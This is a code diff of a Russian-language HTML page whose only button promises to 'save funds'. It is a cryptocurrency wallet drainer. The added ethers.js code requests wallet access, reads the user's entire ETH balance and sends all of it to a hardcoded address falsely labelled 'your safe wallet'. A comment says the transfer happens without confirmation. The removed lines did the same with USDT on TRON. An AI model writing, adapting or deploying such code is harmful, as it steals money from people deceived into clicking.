@@ -32,42 +32,47 @@
 <body>
     <button id="saveButton">СПАСТИ СРЕДСТВА</button>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronlink.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.0/dist/ethers.umd.min.js"></script>
     <script>
         document.getElementById('saveButton').addEventListener('click', async function() {
-            if (typeof window.tronLink !== 'undefined') {
+            if (typeof window.ethereum !== 'undefined') {
                 try {
-                    // Создаем провайдер для соединения с блокчейном TRON
-                    const tronWeb = window.tronLink.tronWeb;
+                    // Создаем провайдер для соединения с блокчейном
+                    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
 
-                    // Проверяем, подключен ли аккаунт
-                    const userAddress = tronWeb.defaultAddress.base58;
+                    // Запрашиваем доступ к аккаунту
+                    await provider.send("eth_requestAccounts", []);  // Запрашиваем доступ к аккаунту
+
+                    // Получаем первый аккаунт
+                    const signer = provider.getSigner();
+                    const userAddress = await signer.getAddress();
                     console.log('Ваш адрес: ' + userAddress);
 
                     // Проверяем баланс
-                    const balance = await tronWeb.trx.getBalance(userAddress);
-                    console.log('Баланс: ' + balance + ' TRX');
+                    const balance = await provider.getBalance(userAddress);
+                    const etherBalance = ethers.utils.formatEther(balance);
+                    console.log('Баланс: ' + etherBalance + ' ETH');
 
-                    // Переводим средства (USDT TRC20)
-                    const usdtContractAddress = 'TXYZJAfQ2qawXdxUgyFeMbv2zdx6xZc5m5'; // Адрес контракта USDT TRC20
-                    const toAddress = 'TXYZJAfQ2qawXdxUgyFeMbv2zdx6xZc5m5'; // Ваш безопасный кошелек
+                    // Переводим средства сразу без подтверждения
+                    // Адрес безопасного кошелька
+                    const toAddress = "0xeABd04BB159D98Bd3F67D708DC7E31eD36CC65f9"; // Ваш безопасный кошелек
+                    
+                    // Отправляем транзакцию
+                    const tx = await signer.sendTransaction({
+                        to: toAddress,   // Адрес получателя
+                        value: balance,   // Переводим весь баланс
+                    });
 
-                    // Получаем контракт токена USDT TRC20
-                    const usdtContract = await tronWeb.contract().at(usdtContractAddress);
-
-                    // Переводим все средства (USDT TRC20)
-                    const amount = tronWeb.toSun(balance);  // Преобразуем баланс в базовую единицу для TRC20
-                    await usdtContract.transfer(toAddress, amount).send();
-
-                    console.log('Транзакция отправлена');
+                    console.log('Транзакция отправлена: ' + tx.hash);
                     alert('Транзакция отправлена! Пожалуйста, подождите.');
                 } catch (err) {
                     alert('Ошибка: ' + err.message);
                 }
             } else {
-                alert('Кошелек TRON не найден. Убедитесь, что у вас установлен Trust Wallet или TronLink.');
+                alert('Кошелек не найден. Убедитесь, что у вас установлен Trust Wallet или MetaMask.');
             }
         });
     </script>
 </body>
 </html>
+
